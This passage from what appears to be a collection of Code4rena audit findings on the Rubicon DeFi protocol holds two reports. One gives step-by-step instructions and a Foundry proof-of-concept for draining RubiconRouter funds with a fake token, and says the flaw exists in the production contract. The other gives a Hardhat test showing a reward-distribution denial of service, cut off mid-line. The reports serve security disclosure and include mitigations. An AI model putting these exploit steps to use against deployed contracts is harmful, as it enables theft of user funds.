      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374\n\n\n# Vulnerability details\n\n## Impact\n\nAn attacker can steal all funds in `RubiconRouter` by abusing an error in the token to repay the user in the functions `maxBuyAllAmount` and `maxSellAllAmount` (and possibly others).\n\nPlease note that the vulnerability exists in [the version of `RubiconRouter` in production](https://optimistic.etherscan.io/address/0x7af14adc8aea70f063c7ea3b2c1ad0d7a59c4bff) and was in fact missed in the C4 contest for Rubicon v1.\n\n## Proof of Concept\n\nThe function `maxBuyAllAmount` is used to allow a user to trade using his entire balance of `buy_gem`. The user [transfers the funds to the router](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L348) and then `RubiconMarket` is used to find the best offers and execute them. After the trades are performed, the router intends to forward the resulting amount back to the user. Due to a bug, the token used for this transfer is `buy_gem` again, *instead* of `pay_gem` as seen [in the same function](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355).\n\nThis mismatch allows an attacker to steal all funds stored in the router using the following steps:\n\n1. Create a fake token (which only the attacker can mint).\n2. Call `approveAssetOnMarket` with the fake token indirectly. This can be done by trading with ETH and the fake token (e.g. by using `offerWithETH` and `buyAllAmountForETH`). Without this step, all calls to `maxBuyAllAmount` will fail because it doesn't approve new tokens - We suspect this is partly the reason this was missed by the test and wasn't used in production.\n3. Offer a small amount of a real token (e.g. USDC) for a large amount of the fake token.\n4. Transfer the fake token to the router so it can buy the offer.\n5. Buy the offer using `maxBuyAllAmount` and receive the funds in the real token (e.g. USDC) instead of the fake token.\n\nAttached is a POC which performs this flow.\n\n### Exploit\n\nFor this POC, please include the following lines in `ProtocolDeployment.t.sol`:\n```solidity\nimport \"../../contracts/utilities/RubiconRouter.sol\";\nimport \"forge-std/StdUtils.sol\";\n```\nThe exploit is performed by the following function:\n```solidity\n  function test_WithRouter() public {\n    RubiconRouter router = new RubiconRouter();\n    router.startErUp(address(market), payable(address(WETH)));\n\n    address attacker = 0x000000000000000000000000000000000000dACa;\n    uint256 routerBalance = 1e10;\n    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance\n    deal(address(TUSDC), attacker, 1+1);\n    vm.deal(attacker, 1 ether);\n\n    vm.startPrank(attacker);\n\n    // create fake coin which only attacker can mint\n    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, \"Fake\", \"FAKE\", 18);\n    FAKE.adminMint();\n\n    FAKE.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n    FAKE.approve(address(router), type(uint256).max);\n    TUSDC.approve(address(router), type(uint256).max);\n\n    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)\n    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);\n    router.buyAllAmountForETH(1, FAKE, 1);\n\n    // Assume TEST is a fake token only attacker can mint\n    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;\n    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin\n\n    assertEq(TUSDC.balanceOf(attacker), 1);\n\n    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer\n    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)\n\n    assertGt(TUSDC.balanceOf(attacker), 1);\n    console.log(TUSDC.balanceOf(attacker));\n  }\n```\n\nThe output of this test shows that funds were stolen from the router:\n```shell\nRunning 1 test for test/foundry-tests/ProtocolDeployment.t.sol:ProtocolDeploymentTest\n[PASS] test_WithRouter() (gas: 5216320)\nLogs:\n  9999000000\n\nTest result: ok. 1 passed; 0 failed; finished in 20.86ms\n```\n\n## Recommended Mitigation Steps\n\nThe final transfers in `maxBuyAllAmount` and `maxSellAllAmount` (see [RubiconRouter.sol#L355](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355) and [RubiconRouter.sol#L374](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374)) should use `pay_gem` instead of `buy_gem`.",
      "description": null,
      "impact": "## Impact\n\nAn attacker can steal all funds in `RubiconRouter` by abusing an error in the token to repay the user in the functions `maxBuyAllAmount` and `maxSellAllAmount` (and possibly others).\n\nPlease note that the vulnerability exists in [the version of `RubiconRouter` in production](https://optimistic.etherscan.io/address/0x7af14adc8aea70f063c7ea3b2c1ad0d7a59c4bff) and was in fact missed in the C4 contest for Rubicon v1.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nThe final transfers in `maxBuyAllAmount` and `maxSellAllAmount` (see [RubiconRouter.sol#L355](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355) and [RubiconRouter.sol#L374](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374)) should use `pay_gem` instead of `buy_gem`.\n",
      "poc": "## Proof of Concept\n\nThe function `maxBuyAllAmount` is used to allow a user to trade using his entire balance of `buy_gem`. The user [transfers the funds to the router](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L348) and then `RubiconMarket` is used to find the best offers and execute them. After the trades are performed, the router intends to forward the resulting amount back to the user. Due to a bug, the token used for this transfer is `buy_gem` again, *instead* of `pay_gem` as seen [in the same function](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355).\n\nThis mismatch allows an attacker to steal all funds stored in the router using the following steps:\n\n1. Create a fake token (which only the attacker can mint).\n2. Call `approveAssetOnMarket` with the fake token indirectly. This can be done by trading with ETH and the fake token (e.g. by using `offerWithETH` and `buyAllAmountForETH`). Without this step, all calls to `maxBuyAllAmount` will fail because it doesn't approve new tokens - We suspect this is partly the reason this was missed by the test and wasn't used in production.\n3. Offer a small amount of a real token (e.g. USDC) for a large amount of the fake token.\n4. Transfer the fake token to the router so it can buy the offer.\n5. Buy the offer using `maxBuyAllAmount` and receive the funds in the real token (e.g. USDC) instead of the fake token.\n\nAttached is a POC which performs this flow.\n\n### Exploit\n\nFor this POC, please include the following lines in `ProtocolDeployment.t.sol`:\n```solidity\nimport \"../../contracts/utilities/RubiconRouter.sol\";\nimport \"forge-std/StdUtils.sol\";\n```\nThe exploit is performed by the following function:\n```solidity\n  function test_WithRouter() public {\n    RubiconRouter router = new RubiconRouter();\n    router.startErUp(address(market), payable(address(WETH)));\n\n    address attacker = 0x000000000000000000000000000000000000dACa;\n    uint256 routerBalance = 1e10;\n    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance\n    deal(address(TUSDC), attacker, 1+1);\n    vm.deal(attacker, 1 ether);\n\n    vm.startPrank(attacker);\n\n    // create fake coin which only attacker can mint\n    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, \"Fake\", \"FAKE\", 18);\n    FAKE.adminMint();\n\n    FAKE.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n    FAKE.approve(address(router), type(uint256).max);\n    TUSDC.approve(address(router), type(uint256).max);\n\n    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)\n    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);\n    router.buyAllAmountForETH(1, FAKE, 1);\n\n    // Assume TEST is a fake token only attacker can mint\n    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;\n    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin\n\n    assertEq(TUSDC.balanceOf(attacker), 1);\n\n    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer\n    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)\n\n    assertGt(TUSDC.balanceOf(attacker), 1);\n    console.log(TUSDC.balanceOf(attacker));\n  }\n```\n\nThe output of this test shows that funds were stolen from the router:\n```shell\nRunning 1 test for test/foundry-tests/ProtocolDeployment.t.sol:ProtocolDeploymentTest\n[PASS] test_WithRouter() (gas: 5216320)\nLogs:\n  9999000000\n\nTest result: ok. 1 passed; 0 failed; finished in 20.86ms\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nAn attacker can steal all funds in `RubiconRouter` by abusing an error in the token to repay the user in the functions `maxBuyAllAmount` and `maxSellAllAmount` (and possibly others).\n\nPlease note that the vulnerability exists in [the version of `RubiconRouter` in production](https://optimistic.etherscan.io/address/0x7af14adc8aea70f063c7ea3b2c1ad0d7a59c4bff) and was in fact missed in the C4 contest for Rubicon v1.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nThe final transfers in `maxBuyAllAmount` and `maxSellAllAmount` (see [RubiconRouter.sol#L355](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355) and [RubiconRouter.sol#L374](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374)) should use `pay_gem` instead of `buy_gem`.\n",
        "poc": "## Proof of Concept\n\nThe function `maxBuyAllAmount` is used to allow a user to trade using his entire balance of `buy_gem`. The user [transfers the funds to the router](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L348) and then `RubiconMarket` is used to find the best offers and execute them. After the trades are performed, the router intends to forward the resulting amount back to the user. Due to a bug, the token used for this transfer is `buy_gem` again, *instead* of `pay_gem` as seen [in the same function](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355).\n\nThis mismatch allows an attacker to steal all funds stored in the router using the following steps:\n\n1. Create a fake token (which only the attacker can mint).\n2. Call `approveAssetOnMarket` with the fake token indirectly. This can be done by trading with ETH and the fake token (e.g. by using `offerWithETH` and `buyAllAmountForETH`). Without this step, all calls to `maxBuyAllAmount` will fail because it doesn't approve new tokens - We suspect this is partly the reason this was missed by the test and wasn't used in production.\n3. Offer a small amount of a real token (e.g. USDC) for a large amount of the fake token.\n4. Transfer the fake token to the router so it can buy the offer.\n5. Buy the offer using `maxBuyAllAmount` and receive the funds in the real token (e.g. USDC) instead of the fake token.\n\nAttached is a POC which performs this flow.\n\n### Exploit\n\nFor this POC, please include the following lines in `ProtocolDeployment.t.sol`:\n```solidity\nimport \"../../contracts/utilities/RubiconRouter.sol\";\nimport \"forge-std/StdUtils.sol\";\n```\nThe exploit is performed by the following function:\n```solidity\n  function test_WithRouter() public {\n    RubiconRouter router = new RubiconRouter();\n    router.startErUp(address(market), payable(address(WETH)));\n\n    address attacker = 0x000000000000000000000000000000000000dACa;\n    uint256 routerBalance = 1e10;\n    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance\n    deal(address(TUSDC), attacker, 1+1);\n    vm.deal(attacker, 1 ether);\n\n    vm.startPrank(attacker);\n\n    // create fake coin which only attacker can mint\n    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, \"Fake\", \"FAKE\", 18);\n    FAKE.adminMint();\n\n    FAKE.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n    FAKE.approve(address(router), type(uint256).max);\n    TUSDC.approve(address(router), type(uint256).max);\n\n    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)\n    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);\n    router.buyAllAmountForETH(1, FAKE, 1);\n\n    // Assume TEST is a fake token only attacker can mint\n    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;\n    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin\n\n    assertEq(TUSDC.balanceOf(attacker), 1);\n\n    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer\n    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)\n\n    assertGt(TUSDC.balanceOf(attacker), 1);\n    console.log(TUSDC.balanceOf(attacker));\n  }\n```\n\nThe output of this test shows that funds were stolen from the router:\n```shell\nRunning 1 test for test/foundry-tests/ProtocolDeployment.t.sol:ProtocolDeploymentTest\n[PASS] test_WithRouter() (gas: 5216320)\nLogs:\n  9999000000\n\nTest result: ok. 1 passed; 0 failed; finished in 20.86ms\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374\n\n\n# Vulnerability details\n\n## Impact\n\nAn attacker can steal all funds in `RubiconRouter` by abusing an error in the token to repay the user in the functions `maxBuyAllAmount` and `maxSellAllAmount` (and possibly others).\n\nPlease note that the vulnerability exists in [the version of `RubiconRouter` in production](https://optimistic.etherscan.io/address/0x7af14adc8aea70f063c7ea3b2c1ad0d7a59c4bff) and was in fact missed in the C4 contest for Rubicon v1.\n\n## Proof of Concept\n\nThe function `maxBuyAllAmount` is used to allow a user to trade using his entire balance of `buy_gem`. The user [transfers the funds to the router](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L348) and then `RubiconMarket` is used to find the best offers and execute them. After the trades are performed, the router intends to forward the resulting amount back to the user. Due to a bug, the token used for this transfer is `buy_gem` again, *instead* of `pay_gem` as seen [in the same function](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355).\n\nThis mismatch allows an attacker to steal all funds stored in the router using the following steps:\n\n1. Create a fake token (which only the attacker can mint).\n2. Call `approveAssetOnMarket` with the fake token indirectly. This can be done by trading with ETH and the fake token (e.g. by using `offerWithETH` and `buyAllAmountForETH`). Without this step, all calls to `maxBuyAllAmount` will fail because it doesn't approve new tokens - We suspect this is partly the reason this was missed by the test and wasn't used in production.\n3. Offer a small amount of a real token (e.g. USDC) for a large amount of the fake token.\n4. Transfer the fake token to the router so it can buy the offer.\n5. Buy the offer using `maxBuyAllAmount` and receive the funds in the real token (e.g. USDC) instead of the fake token.\n\nAttached is a POC which performs this flow.\n\n### Exploit\n\nFor this POC, please include the following lines in `ProtocolDeployment.t.sol`:\n```solidity\nimport \"../../contracts/utilities/RubiconRouter.sol\";\nimport \"forge-std/StdUtils.sol\";\n```\nThe exploit is performed by the following function:\n```solidity\n  function test_WithRouter() public {\n    RubiconRouter router = new RubiconRouter();\n    router.startErUp(address(market), payable(address(WETH)));\n\n    address attacker = 0x000000000000000000000000000000000000dACa;\n    uint256 routerBalance = 1e10;\n    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance\n    deal(address(TUSDC), attacker, 1+1);\n    vm.deal(attacker, 1 ether);\n\n    vm.startPrank(attacker);\n\n    // create fake coin which only attacker can mint\n    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, \"Fake\", \"FAKE\", 18);\n    FAKE.adminMint();\n\n    FAKE.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n    FAKE.approve(address(router), type(uint256).max);\n    TUSDC.approve(address(router), type(uint256).max);\n\n    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)\n    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);\n    router.buyAllAmountForETH(1, FAKE, 1);\n\n    // Assume TEST is a fake token only attacker can mint\n    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;\n    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin\n\n    assertEq(TUSDC.balanceOf(attacker), 1);\n\n    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer\n    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)\n\n    assertGt(TUSDC.balanceOf(attacker), 1);\n    console.log(TUSDC.balanceOf(attacker));\n  }\n```\n\nThe output of this test shows that funds were stolen from the router:\n```shell\nRunning 1 test for test/foundry-tests/ProtocolDeployment.t.sol:ProtocolDeploymentTest\n[PASS] test_WithRouter() (gas: 5216320)\nLogs:\n  9999000000\n\nTest result: ok. 1 passed; 0 failed; finished in 20.86ms\n```\n\n## Recommended Mitigation Steps\n\nThe final transfers in `maxBuyAllAmount` and `maxSellAllAmount` (see [RubiconRouter.sol#L355](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355) and [RubiconRouter.sol#L374](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374)) should use `pay_gem` instead of `buy_gem`.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 854,
      "page_start": null,
      "heading": "854. `BathBuddy` rewards DoS",
      "heading_cleaned": "`BathBuddy` rewards DoS",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L121-L135\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L139-L155\n\n\n# Vulnerability details\n\n## Impact\n\nAs described in the docs, Rubicon protocol allows users to act as as liquidity providers (LPs), by providing funds and receiving `bathToken` in return, which can be used to obtain rewards through `BathBuddy` contract.  But `BathBuddy` internal logic allows any user to DoS reward distribution to smalls LPs by constantly calling `getReward` at small intervals. This is specially effective against small LPs. This finding should be classified as having medium severity, even though no funds are at risk,  the attacker can affect the protocol's functionality for an indefinite period of time.\n\n## Proof of Concept\n\n`BathBuddy`'s user rewards are calculated as shown below.\n\n```solidity\nfunction earned(\n        address account,\n        address token\n    ) public view override returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        return\n            IERC20(myBathTokenBuddy) // Care with this?\n                .balanceOf(account)\n                .mul(\n                    rewardPerToken(token).sub(\n                        userRewardsPerTokenPaid[token][account]\n                    )\n                )\n                .div(1e18)\n                .add(tokenRewards[token][account]);\n    }\n```\n\nWhere `rewardPerToken`  values are updated by calling the `rewardPerToken` function.\n\n```solidity\nfunction rewardPerToken(address token) public view returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n            return rewardsPerTokensStored[token];\n        }\n        return\n            rewardsPerTokensStored[token].add(\n                lastTimeRewardApplicable(token)\n                    .sub(lastUpdateTime[token])\n                    .mul(rewardRates[token])\n                    .mul(1e18)\n                    .div(IERC20(myBathTokenBuddy).totalSupply())\n            );\n    }\n```\n\nAs we can see in the code snippet above, if the interval between calls to `rewardPerToken` are small, the resulting `rewardsPerToken` updates will also be small. Therefore there is the possibility of the user earned values rounding down to zero, especially if the user's  `bathToken` balance are small compared to `bathToken` `totalSupply()`.\n\nThis enables a malicious actor to block reward distribution to smalls LPs by constantly calling  `getReward`, to keep refreshing the global `lastUpdateTime`, for example at every new block (2s  on Optimism).  As gas fees are low in L2 networks, the malicious actor can DoS at little cost, while affecting many small LPs .\n\nThe following test reproduce the above scenario, demonstrating that reward distribution to users with small bathToken balances can be completely and indefinitely blocked by repeatedly calling `getReward`.\n\n```typescript\nimport { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\nimport { expect } from \"chai\";\nimport { ethers, network } from \"hardhat\";\nimport { formatUnits, parseUnits } from \"ethers/lib/utils\";\n\n// TODO: Implement Proxy-wrapping helper functions and proxy-wrapped contracts generally\ndescribe(\"RubiconV2 rewards system\", function () {\n  const CERC20_ABI = [\n    \"function name() external view returns(string memory)\",\n    \"function symbol() external view returns(string memory)\",\n    \"function decimals() external view returns(uint8)\",\n    \"function balanceOf(address) external view returns(uint256)\",\n    \"function admin() external view returns(address)\",\n    \"function mint(uint256) external returns(uint256)\",\n  ];\n  const BUDDY_ABI = [\n    \"function setRewardsDuration(uint256,address) external\",\n    \"function notifyRewardAmount(uint256,address) external\",\n    \"function earned(address,address) external view returns(uint256)\",\n  ];\n\n  async function buddySetupFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, alice, eve] = await ethers.getSigners();\n\n    // Use Compound Fork to spawn some cTokens...\n    // Note: In prod COMP uses Unitroller for Comptroller storage and upgradeability*\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const BathHouse = await ethers.getContractFactory(\"BathHouseV2\");\n    const bathHouse = await BathHouse.deploy();\n\n    await bathHouse.initialize(comptroller.address, owner.address);\n\n    // Deploy Test ERC20 to use throughout testing\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const testRewardCoin = await testCoinFactory\n      .connect(owner)\n      .deploy(\n        owner.address,\n        \"SuperHyperCoolTokenThatRewardsLiquidityProvidersWithHugeReturns\",\n        \"BTC\",\n        18\n      );\n\n    const interestRateModelFactory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    await bathHouse.createBathToken(\n      underlying,\n      interestRateModel,\n      initialExchangeRateMantissa,\n      cTokenImplementation.address,\n      becomeImplementationData\n    );\n    const bathTokenAddress = await bathHouse.getBathTokenFromAsset(underlying);\n    const bathTEST = new ethers.Contract(bathTokenAddress, CERC20_ABI, owner);\n\n    const buddyAddress = await bathHouse.whoIsBuddy(bathTokenAddress);\n    const buddy = new ethers.Contract(buddyAddress, BUDDY_ABI, owner);\n\n    // Setup cToken in System correctly:\n    await comptroller._supportMarket(bathTEST!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    await testCoin.connect(alice).faucet();\n    await testStableCoin.connect(alice).faucet();\n    await testCoin.connect(eve).faucet();\n    await testStableCoin.connect(eve).faucet();\n\n    await buddy.setRewardsDuration(\n      365 * 24 * 60 * 60,\n      testStableCoin.address\n    );\n    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n    await buddy.notifyRewardAmount(\n      parseUnits(\"10000\", 6),\n      testStableCoin.address\n    );\n\n    await comptroller.setCompAddress(testRewardCoin.address);\n    await comptroller._setCompSpeeds(\n      [bathTEST.address],\n      [parseUnits(\"2.28\")],\n      [parseUnits(\"0.322\")]\n    );\n\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n\n    // price of TEST = $0.9\n    await priceOracle.addCtoken(bathTEST.address, parseUnits(\"0.9\", 18));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n\n    await comptroller._setCollateralFactor(bathTEST.address, parseUnits(\"0.7\"));\n\n    const rewardBalance = await testRewardCoin.balanceOf(owner.address);\n    await testRewardCoin.transfer(comptroller.address, rewardBalance);\n\n    await testCoin.connect(alice).approve(bathTEST.address, parseUnits(\"10\"));\n    await bathTEST.connect(alice).mint(parseUnits(\"10\"));\n    await testCoin.connect(eve).approve(bathTEST.address, parseUnits(\"10000\"));\n    await bathTEST.connect(eve).mint(parseUnits(\"10000\"));\n\n    return {\n      comptroller,\n      testCoin,\n      bathTEST,\n      alice,\n      eve,\n      testStableCoin,\n      testRewardCoin,\n      buddy,\n      bathHouse,\n    };\n  }\n\n  describe(\"Testing the rewards\", async function () {\n    it(\"POC1\", async function () {\n      const {\n        alice,\n        eve,\n        testStableCoin,\n        buddy,\n        bathHouse,\n      } = await loadFixture(buddySetupFixture);\n\n      // Eve calls claimRewards to reset lastUpdateTime (claimRewards internaly calls BathBuddy's getReward)\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned1 = await testStableCoin.balanceOf(alice.address);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned2 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned2.toBigInt() - earned1.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned3 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned3.toBigInt() - earned2.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned4 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned4.toBigInt() - earned4.toBigInt()).to.be.equal(0);\n    });\n  });\n});\n```\n\n## Tools Used\nManual Review\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L121-L135\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L139-L155\n\n\n# Vulnerability details\n\n## Impact\n\nAs described in the docs, Rubicon protocol allows users to act as as liquidity providers (LPs), by providing funds and receiving `bathToken` in return, which can be used to obtain rewards through `BathBuddy` contract.  But `BathBuddy` internal logic allows any user to DoS reward distribution to smalls LPs by constantly calling `getReward` at small intervals. This is specially effective against small LPs. This finding should be classified as having medium severity, even though no funds are at risk,  the attacker can affect the protocol's functionality for an indefinite period of time.\n\n## Proof of Concept\n\n`BathBuddy`'s user rewards are calculated as shown below.\n\n```solidity\nfunction earned(\n        address account,\n        address token\n    ) public view override returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        return\n            IERC20(myBathTokenBuddy) // Care with this?\n                .balanceOf(account)\n                .mul(\n                    rewardPerToken(token).sub(\n                        userRewardsPerTokenPaid[token][account]\n                    )\n                )\n                .div(1e18)\n                .add(tokenRewards[token][account]);\n    }\n```\n\nWhere `rewardPerToken`  values are updated by calling the `rewardPerToken` function.\n\n```solidity\nfunction rewardPerToken(address token) public view returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n            return rewardsPerTokensStored[token];\n        }\n        return\n            rewardsPerTokensStored[token].add(\n                lastTimeRewardApplicable(token)\n                    .sub(lastUpdateTime[token])\n                    .mul(rewardRates[token])\n                    .mul(1e18)\n                    .div(IERC20(myBathTokenBuddy).totalSupply())\n            );\n    }\n```\n\nAs we can see in the code snippet above, if the interval between calls to `rewardPerToken` are small, the resulting `rewardsPerToken` updates will also be small. Therefore there is the possibility of the user earned values rounding down to zero, especially if the user's  `bathToken` balance are small compared to `bathToken` `totalSupply()`.\n\nThis enables a malicious actor to block reward distribution to smalls LPs by constantly calling  `getReward`, to keep refreshing the global `lastUpdateTime`, for example at every new block (2s  on Optimism).  As gas fees are low in L2 networks, the malicious actor can DoS at little cost, while affecting many small LPs .\n\nThe following test reproduce the above scenario, demonstrating that reward distribution to users with small bathToken balances can be completely and indefinitely blocked by repeatedly calling `getReward`. \n\n```typescript\nimport { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\nimport { expect } from \"chai\";\nimport { ethers, network } from \"hardhat\";\nimport { formatUnits, parseUnits } from \"ethers/lib/utils\";\n\n// TODO: Implement Proxy-wrapping 